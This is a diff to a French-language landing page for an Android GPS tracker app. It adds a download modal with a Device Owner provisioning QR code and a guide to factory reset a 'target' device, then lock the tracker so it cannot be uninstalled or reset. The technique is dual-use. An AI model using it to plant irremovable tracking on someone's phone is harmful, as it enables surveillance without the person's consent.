@@ -233,8 +233,156 @@
 
   </div><!-- /vitrine -->
 
+  <!-- ══════════════════════════════════════════════════════════
+       MODALE — Téléchargement APK + Guide installation MDM
+       ══════════════════════════════════════════════════════════ -->
+  <div id="dlModal" role="dialog" aria-modal="true" aria-labelledby="dlModalTitle"
+       class="fixed inset-0 z-[100] hidden items-center justify-center p-4"
+       style="background:rgba(0,0,0,.75);backdrop-filter:blur(6px)">
+
+    <div id="dlModalBox"
+         class="relative w-full max-w-lg bg-slate-900 border border-sky-500/40 rounded-2xl shadow-2xl shadow-sky-500/10 overflow-hidden"
+         style="max-height:90vh;overflow-y:auto">
+
+      <!-- Barre décorative top -->
+      <div class="h-1 w-full bg-gradient-to-r from-sky-500 via-cyan-400 to-blue-600"></div>
+
+      <!-- Bouton fermeture -->
+      <button id="dlModalClose" aria-label="Fermer"
+              class="absolute top-4 right-4 w-8 h-8 flex items-center justify-center rounded-full bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition-all text-lg font-bold z-10">
+        ✕
+      </button>
+
+      <!-- ── VUE A : Choix d'installation ── -->
+      <div id="dlViewChoice" class="p-6 sm:p-8">
+
+        <!-- Titre -->
+        <div class="text-center mb-6">
+          <div class="inline-flex items-center justify-center w-14 h-14 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-3xl mb-3">📥</div>
+          <h2 id="dlModalTitle" class="text-xl font-extrabold text-white">Téléchargement lancé !</h2>
+          <p class="text-slate-400 text-sm mt-1">Choisissez votre mode d'installation</p>
+        </div>
+
+        <!-- Option A -->
+        <div class="bg-slate-800/60 border border-slate-700 rounded-xl p-4 mb-4">
+          <div class="flex items-start gap-3">
+            <span class="text-2xl mt-0.5">📦</span>
+            <div>
+              <h3 class="font-bold text-white text-sm mb-1">
+                Option A — Installation standard
+              </h3>
+              <p class="text-slate-400 text-xs leading-relaxed">
+                Installez le fichier APK normalement sur votre téléphone.
+              </p>
+              <div class="mt-2 flex items-start gap-2 bg-amber-500/10 border border-amber-500/20 rounded-lg px-3 py-2">
+                <span class="text-amber-400 text-xs mt-0.5">⚠️</span>
+                <p class="text-amber-300 text-xs leading-relaxed">
+                  Dans ce mode, l'application peut être désinstallée ou le téléphone réinitialisé par un tiers.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Option B -->
+        <div class="bg-gradient-to-br from-sky-900/40 to-blue-900/40 border border-sky-500/50 rounded-xl p-4 mb-6">
+          <div class="flex items-start gap-3">
+            <span class="text-2xl mt-0.5">🛡️</span>
+            <div class="flex-1">
+              <div class="flex items-center gap-2 mb-1">
+                <h3 class="font-bold text-sky-300 text-sm">Option B — Bouclier Anti-Vol Inviolable</h3>
+                <span class="px-2 py-0.5 bg-sky-500/20 text-sky-400 text-xs font-bold rounded-full border border-sky-500/30">RECOMMANDÉ</span>
+              </div>
+              <p class="text-slate-300 text-xs leading-relaxed mb-3">
+                Bloquez définitivement la désinstallation et le Factory Reset en passant en mode
+                <strong class="text-sky-400">MDM Device Owner</strong> — l'appareil est verrouillé sur votre application.
+              </p>
+              <button id="btnShowQR"
+                      class="w-full flex items-center justify-center gap-2 px-4 py-2.5 bg-gradient-to-r from-sky-600 to-blue-600 hover:from-sky-500 hover:to-blue-500 text-white font-bold rounded-lg transition-all text-sm shadow-lg shadow-sky-500/20">
+                <span>🔒</span> Afficher le QR Code de Sécurité Totale
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Bouton continuer -->
+        <button id="dlModalContinue"
+                class="w-full py-3 bg-slate-700 hover:bg-slate-600 text-slate-300 hover:text-white font-semibold rounded-xl transition-all text-sm">
+          Continuer vers mon espace →
+        </button>
+
+      </div><!-- /dlViewChoice -->
+
+      <!-- ── VUE B : QR Code MDM ── -->
+      <div id="dlViewQR" class="p-6 sm:p-8 hidden">
+
+        <!-- Retour -->
+        <button id="btnBackToChoice"
+                class="flex items-center gap-1 text-slate-400 hover:text-sky-400 text-xs mb-5 transition-colors">
+          ← Retour aux options
+        </button>
+
+        <div class="text-center mb-6">
+          <div class="inline-flex items-center justify-center w-14 h-14 rounded-full bg-sky-500/10 border border-sky-500/30 text-3xl mb-3">🔒</div>
+          <h2 class="text-xl font-extrabold text-white">QR Code de Sécurité Totale</h2>
+          <p class="text-slate-400 text-sm mt-1">Enrôlement Android Enterprise — Device Owner</p>
+        </div>
+
+        <!-- QR Code -->
+        <div class="flex justify-center mb-6">
+          <div class="p-3 bg-white rounded-2xl shadow-xl shadow-sky-500/10 border-2 border-sky-500/30">
+            <div id="qrCanvas"></div>
+          </div>
+        </div>
+
+        <!-- Guide 3 étapes -->
+        <div class="bg-slate-800/60 border border-slate-700 rounded-xl p-4 mb-6">
+          <h4 class="text-xs font-bold text-slate-300 uppercase tracking-widest mb-3">Guide en 3 étapes</h4>
+          <div class="space-y-3">
+            <div class="flex items-start gap-3">
+              <span class="flex-shrink-0 w-6 h-6 rounded-full bg-sky-600 text-white text-xs font-bold flex items-center justify-center">1</span>
+              <p class="text-slate-300 text-xs leading-relaxed pt-0.5">
+                <strong class="text-white">Réinitialisez</strong> l'appareil cible (retour à l'état d'usine).
+              </p>
+            </div>
+            <div class="flex items-start gap-3">
+              <span class="flex-shrink-0 w-6 h-6 rounded-full bg-sky-600 text-white text-xs font-bold flex items-center justify-center">2</span>
+              <p class="text-slate-300 text-xs leading-relaxed pt-0.5">
+                Sur l'écran <strong class="text-white">"Bienvenue"</strong>, tapotez <strong class="text-sky-400">6 fois</strong> rapidement sur l'écran pour activer le mode enrôlement.
+              </p>
+            </div>
+            <div class="flex items-start gap-3">
+              <span class="flex-shrink-0 w-6 h-6 rounded-full bg-sky-600 text-white text-xs font-bold flex items-center justify-center">3</span>
+              <p class="text-slate-300 text-xs leading-relaxed pt-0.5">
+                <strong class="text-white">Scannez ce QR Code</strong> — l'appareil télécharge et installe l'APK automatiquement, puis se verrouille en mode Device Owner.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Avertissement checksum -->
+        <div class="bg-amber-500/10 border border-amber-500/20 rounded-lg px-4 py-3 mb-5 text-xs text-amber-300 leading-relaxed">
+          ⚠️ <strong>Avant utilisation :</strong> remplacez le champ
+          <code class="bg-slate-800 px-1 rounded text-amber-200">PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM</code>
+          dans <code class="bg-slate-800 px-1 rounded text-amber-200">android/qr-provisioning.json</code>
+          par le SHA-256 Base64 de votre APK signé (voir <code class="bg-slate-800 px-1 rounded">extract-checksum.bat</code>).
+        </div>
+
+        <button id="dlModalContinue2"
+                class="w-full py-3 bg-slate-700 hover:bg-slate-600 text-slate-300 hover:text-white font-semibold rounded-xl transition-all text-sm">
+          Continuer vers mon espace →
+        </button>
+
+      </div><!-- /dlViewQR -->
+
+    </div><!-- /dlModalBox -->
+  </div><!-- /dlModal -->
+
+  <!-- qrcode.js (génération QR Code côté client) -->
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+
   <script type="module">
-    // Ping le serveur avant d'afficher la vitrine
+    // ── Ping le serveur avant d'afficher la vitrine ──────────
     const splash   = document.getElementById('splash');
     const vitrine  = document.getElementById('vitrine');
     const statusEl = document.getElementById('splash-status');
@@ -251,12 +399,135 @@
         } catch { /* retry */ }
         if (i < maxAttempts) await new Promise(r => setTimeout(r, intervalMs));
       }
-      // Afficher la vitrine
-      splash.style.display  = 'none';
+      splash.style.display = 'none';
       vitrine.classList.remove('hidden');
     }
 
     pingHealth();
+  </script>
+
+  <script>
+    // ── Modale téléchargement APK ────────────────────────────
+    (function () {
+      'use strict';
+
+      // Payload JSON pour le QR Code d'enrôlement Device Owner
+      // Aligné sur android/qr-provisioning.json
+      const QR_PAYLOAD = JSON.stringify({
+        "android.app.extra.PROVISIONING_DEVICE_ADMIN_COMPONENT_NAME":
+          "com.gpstracker.agent/.AdminReceiver",
+        "android.app.extra.PROVISIONING_DEVICE_ADMIN_PACKAGE_DOWNLOAD_LOCATION":
+          "https://gps-tracker-congo.onrender.com/download/GPTS-Tracker.apk",
+        "android.app.extra.PROVISIONING_DEVICE_ADMIN_SIGNATURE_CHECKSUM":
+          "REMPLACER_PAR_CHECKSUM_SHA256_BASE64_URL_SAFE",
+        "android.app.extra.PROVISIONING_SKIP_ENCRYPTION": false,
+        "android.app.extra.PROVISIONING_LEAVE_ALL_SYSTEM_APPS_ENABLED": true,
+        "android.app.extra.PROVISIONING_ADMIN_EXTRAS_BUNDLE": {
+          "server_url": "https://db-tracker-d39a7-default-rtdb.firebaseio.com"
+        }
+      });
+
+      const modal        = document.getElementById('dlModal');
+      const viewChoice   = document.getElementById('dlViewChoice');
+      const viewQR       = document.getElementById('dlViewQR');
+      const btnClose     = document.getElementById('dlModalClose');
+      const btnContinue  = document.getElementById('dlModalContinue');
+      const btnContinue2 = document.getElementById('dlModalContinue2');
+      const btnShowQR    = document.getElementById('btnShowQR');
+      const btnBack      = document.getElementById('btnBackToChoice');
+      const qrCanvas     = document.getElementById('qrCanvas');
+
+      let qrGenerated = false;
+
+      // ── Ouvrir la modale ──────────────────────────────────
+      function openModal() {
+        showView('choice');
+        modal.classList.remove('hidden');
+        modal.classList.add('flex');
+        document.body.style.overflow = 'hidden';
+        // Focus trap : focus sur le bouton de fermeture
+        setTimeout(() => btnClose.focus(), 50);
+      }
+
+      // ── Fermer la modale ──────────────────────────────────
+      function closeModal() {
+        modal.classList.add('hidden');
+        modal.classList.remove('flex');
+        document.body.style.overflow = '';
+      }
+
+      // ── Basculer entre les vues ───────────────────────────
+      function showView(name) {
+        viewChoice.classList.toggle('hidden', name !== 'choice');
+        viewQR.classList.toggle('hidden', name !== 'qr');
+      }
+
+      // ── Générer le QR Code (une seule fois) ───────────────
+      function generateQR() {
+        if (qrGenerated) return;
+        qrGenerated = true;
+
+        // Taille responsive : 220px sur mobile, 260px sur desktop
+        const size = window.innerWidth < 480 ? 220 : 260;
+
+        // qrcode.js expose QRCode en global (chargé via CDN non-module)
+        if (typeof QRCode !== 'undefined') {
+          new QRCode(qrCanvas, {
+            text:           QR_PAYLOAD,
+            width:          size,
+            height:         size,
+            colorDark:      '#0f172a',
+            colorLight:     '#ffffff',
+            correctLevel:   QRCode.CorrectLevel.M,
+          });
+        } else {
+          // Fallback : afficher un message si la lib n'est pas chargée
+          qrCanvas.innerHTML =
+            '<p class="text-red-400 text-xs text-center p-4">Impossible de générer le QR Code.<br>Vérifiez votre connexion.</p>';
+        }
+      }
+
+      // ── Fermeture sur clic en dehors de la boîte ─────────
+      modal.addEventListener('click', (e) => {
+        if (e.target === modal) closeModal();
+      });
+
+      // ── Fermeture touche Escape ───────────────────────────
+      document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape' && !modal.classList.contains('hidden')) closeModal();
+      });
+
+      btnClose.addEventListener('click', closeModal);
+      btnContinue.addEventListener('click', () => {
+        closeModal();
+        window.location.href = '/dashboard/login.html';
+      });
+      btnContinue2.addEventListener('click', () => {
+        closeModal();
+        window.location.href = '/dashboard/login.html';
+      });
+
+      // ── Afficher le QR Code ───────────────────────────────
+      btnShowQR.addEventListener('click', () => {
+        showView('qr');
+        generateQR();
+      });
+
+      btnBack.addEventListener('click', () => showView('choice'));
+
+      // ── Intercepter TOUS les boutons de téléchargement APK
+      // Sélectionne les liens pointant vers l'APK (header + hero + guide)
+      document.querySelectorAll('a[href*="GPTS-Tracker.apk"], a[href*="agent.apk"]')
+        .forEach((link) => {
+          link.addEventListener('click', (e) => {
+            // Laisser le téléchargement se lancer normalement
+            // (pas de preventDefault — le navigateur gère le download)
+            // Ouvrir la modale avec un léger délai pour que le download démarre
+            setTimeout(openModal, 150);
+          });
+        });
+
+    })();
   </script>
 </body>
 </html>
